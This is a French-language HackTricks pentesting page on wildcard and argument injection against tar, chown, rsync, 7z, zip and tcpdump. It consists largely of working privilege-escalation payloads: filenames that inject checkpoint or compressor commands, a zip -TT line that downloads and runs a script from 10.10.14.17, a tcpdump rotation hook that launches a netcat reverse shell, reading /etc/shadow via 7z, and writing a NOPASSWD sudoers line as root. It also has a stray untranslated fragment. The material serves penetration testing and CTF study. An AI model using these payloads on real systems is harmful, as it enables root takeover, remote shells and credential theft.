# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L’**argument injection** via wildcard (aussi appelé *glob*) se produit lorsqu’un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non placé entre guillemets, comme `*`.
> Comme le shell développe le wildcard **avant** d’exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut concevoir des noms de fichiers commençant par `-`, afin qu’ils soient interprétés comme des **options plutôt que comme des données**, permettant ainsi d’injecter furtivement des flags arbitraires, voire des commandes.
> Cette page rassemble les primitives les plus utiles, les recherches récentes et les mécanismes de détection modernes pour 2023-2025.

## chown / chmod

Vous pouvez **copier le propriétaire/groupe ou les bits de permission d’un fichier arbitraire** en exploitant le flag `--reference` :
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Lorsque root exécute ensuite quelque chose comme :
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` est injecté, ce qui fait que *tous* les fichiers correspondants héritent de la propriété et des permissions de `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Voir également l'article classique de DefenseCode pour plus de détails.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Exécuter des commandes arbitraires en abusant de la fonctionnalité **checkpoint** :
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Une fois que root exécute, par exemple, `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté en tant que root.

### bsdtar / macOS 14+

Le `tar` par défaut des versions récentes de macOS (basé sur `libarchive`) n'implémente pas `--checkpoint`, mais vous pouvez tout de même obtenir une exécution de code avec le flag **--use-compress-program**, qui permet de spécifier un compresseur externe.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Lorsqu’un script privilégié exécute `tar -cf backup.tar *`, `/bin/sh` sera lancé.

---

## rsync

`rsync` permet de remplacer le shell distant ou même le binaire distant via des options de ligne de commande commençant par `-e` ou `--rsync-path` :
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archive ensuite le répertoire avec `rsync -az * backup:/srv/`, le flag injecté lance votre shell sur le système distant.

*PoC* : [`wildpwn`](https://github.com/localh0t/wildpwn) (mode `rsync`).

---

## 7-Zip / 7z / 7za

Même lorsque le script privilégié préfixe *défensivement* le wildcard avec `--` (pour empêcher l解析 des options), le format 7-Zip prend en charge les **file list files** en préfixant le nom de fichier avec `@`. En combinant cela avec un symlink, vous pouvez *exfiltrer des fichiers arbitraires* :
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root exécute quelque chose comme :
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et s'arrêtera, **en affichant le contenu sur stderr**.

Cela fonctionne malgré `-- *`, car la CLI de 7-Zip accepte explicitement à la fois les noms de fichiers ordinaires et les `@listfiles` comme entrées positionnelles. Ainsi, un nom de fichier littéral tel que `@root.txt` est toujours traité de manière spéciale.

---

## zip

Deux primitives très pratiques existent lorsqu'une application transmet des noms de fichiers contrôlés par l'utilisateur à `zip` (soit via un wildcard, soit en énumérant les noms sans `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook : `-T` active le « test archive » et `-TT <cmd>` remplace le testeur par un programme arbitraire (forme longue : `--unzip-command <cmd>`). Si vous pouvez injecter des noms de fichiers commençant par `-`, répartissez les flags entre plusieurs noms de fichiers distincts afin que le parsing des short-options fonctionne :
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- N’essayez PAS un nom de fichier unique comme `'-T -TT <cmd>'` — les options courtes sont analysées caractère par caractère et cela échouera. Utilisez des tokens séparés comme indiqué.
- Si les slashs sont supprimés des noms de fichiers par l’application, récupérez le contenu depuis un host/IP nu (chemin par défaut `/index.html`) et enregistrez-le localement avec `-O`, puis exécutez-le.
- Vous pouvez déboguer l’analyse avec `-sc` (afficher les argv traités) ou `-h2` (plus d’aide) afin de comprendre comment vos tokens sont consommés.

Exemple (comportement local avec zip 3.0) :
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak : si la couche web renvoie la sortie stdout/stderr de `zip` (cas fréquent avec les wrappers naïfs), des flags injectés comme `--help` ou les échecs provoqués par de mauvaises options apparaîtront dans la réponse HTTP, confirmant l'injection de ligne de commande et facilitant l'ajustement du payload.

---

## Binaires supplémentaires vulnérables à la wildcard injection (liste rapide 2023-2025)

Les commandes suivantes ont été exploitées dans des CTF modernes et des environnements réels. Le payload est toujours créé comme un *nom de fichier* dans un répertoire accessible en écriture qui sera ensuite traité avec une wildcard :

| Binaire | Flag à exploiter | Effet |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → fichier `@` arbitraire | Lire le contenu d'un fichier |
| `flock` | `-c <cmd>` | Exécuter une commande |
| `git`   | `-c core.sshCommand=<cmd>` | Exécution de commande via git over SSH |
| `scp`   | `-S <cmd>` | Lancer un programme arbitraire à la place de ssh |

Ces primitives sont moins courantes que les classiques *tar/rsync/zip*, mais méritent d'être vérifiées lors de la recherche.

---

## Recherche de wrappers et jobs vulnérables

Des études de cas récentes ont montré que la wildcard/argv injection n'est plus seulement un problème de **cron + tar**.<sup>[[5]](#references)</sup> Cette même classe de bugs continue d'apparaître dans :

- les fonctionnalités web qui « téléchargent tout sous forme de zip/tar » depuis des répertoires d'upload contrôlés par l'attaquant
- les shells de debug de fournisseurs ou d'appliances qui exposent un wrapper **tcpdump** avec des champs de nom de fichier/filtre contrôlés par l'attaquant
- les jobs de sauvegarde ou de rotation qui appellent `tar`, `rsync`, `7z`, `zip`, `chown` ou `chmod` sur des répertoires accessibles en écriture

Commandes de triage utiles :
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heuristiques rapides :

- `-- *` est une bonne correction pour de nombreux outils GNU, mais **pas** pour `7z`/`7za`, car les `@listfiles` sont analysés séparément.
- Pour `zip`, recherchez les wrappers qui énumèrent directement les noms de fichiers contrôlés par l'utilisateur ; le découpage des options courtes (`-T` + `-TT <cmd>`) fonctionne toujours même sans glob shell.
- Pour `tcpdump`, prêtez une attention particulière aux wrappers qui vous permettent de contrôler les **noms des fichiers de sortie**, les **paramètres de rotation** ou les arguments de **relecture des fichiers de capture**.

---

## Hooks de rotation de tcpdump (-G/-W/-z) : RCE via argv injection dans les wrappers

Lorsqu'un shell restreint ou un wrapper fourni par un vendeur construit une ligne de commande `tcpdump` en concaténant des champs contrôlés par l'utilisateur (par exemple, un paramètre de « nom de fichier ») sans échappement ni validation stricts, vous pouvez dissimuler des flags `tcpdump` supplémentaires. La combinaison de `-G` (rotation basée sur le temps), `-W` (limitation du nombre de fichiers) et `-z <cmd>` (commande exécutée après la rotation) permet une exécution arbitraire de commandes avec les privilèges de l'utilisateur qui exécute tcpdump (souvent root sur les appliances).<sup>[[1]](#references)[[4]](#references)</sup>

Prérequis :

- Vous pouvez influencer l'`argv` transmis à `tcpdump` (par exemple via un wrapper tel que `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Le wrapper ne nettoie pas les espaces ni les tokens précédés de `-` dans le champ du nom de fichier.

PoC classique (exécute un script de reverse shell depuis un chemin accessible en écriture) :
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Détails :

- `-G 1 -W 1` force une rotation immédiate après le premier paquet correspondant.
- `-z <cmd>` exécute la commande post-rotation une fois par rotation. De nombreux builds exécutent `<cmd> <savefile>`. Si `<cmd>` est un script/interpréteur, assurez-vous que la gestion des arguments correspond à votre payload.

Variantes sans support amovible :

- Si vous disposez d’une autre primitive pour écrire des fichiers (par exemple, un wrapper de commande distinct qui permet la redirection de sortie), placez votre script dans un chemin connu et déclenchez `-z /bin/sh /path/script.sh` ou `-z /path/script.sh`, selon la sémantique de la plateforme.
- Certains wrappers de vendor effectuent la rotation vers des emplacements contrôlables par l’attaquant. Si vous pouvez influencer le chemin de rotation (symlink/traversée de répertoires), vous pouvez diriger `-z` vers l’exécution d’un contenu que vous contrôlez entièrement sans support externe.

---

## sudoers : tcpdump avec des wildcards/arguments supplémentaires → écriture/lecture arbitraires et root

Anti-pattern sudoers très courant :<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problèmes
- Le `*` glob et les patterns permissifs ne contraignent que le premier argument `-w`. `tcpdump` accepte plusieurs options `-w` ; la dernière est prioritaire.
- La règle ne verrouille pas les autres options, donc `-Z`, `-r`, `-V`, etc. sont autorisées.

Primitives
- Remplacer le chemin de destination avec un second `-w` (le premier satisfait uniquement sudoers) :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dans le premier `-w` pour sortir de l’arborescence restreinte :
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forcez la propriété de la sortie avec `-Z root` (crée des fichiers appartenant à root n’importe où) :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Écriture de contenu arbitraire en rejouant un PCAP conçu à cet effet via `-r` (par exemple, pour déposer une ligne sudoers) :

<details>
<summary>Créer un PCAP qui contient la charge utile ASCII exacte et l’écrire en tant que root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lecture arbitraire de fichiers/secret leak avec `-V <file>` (interprète une liste de savefiles). Les diagnostics d’erreur répercutent souvent les lignes, ce qui peut divulguer du contenu :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Références

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump : injection d'arguments de zip vers RCE + mauvaise configuration sudo de tcpdump pour l'élévation de privilèges](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - chaîne d'exploitation complète](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Shell potentiel via une injection de wildcard détectée](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Retour vers le futur : les wildcards Unix déchaînés (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
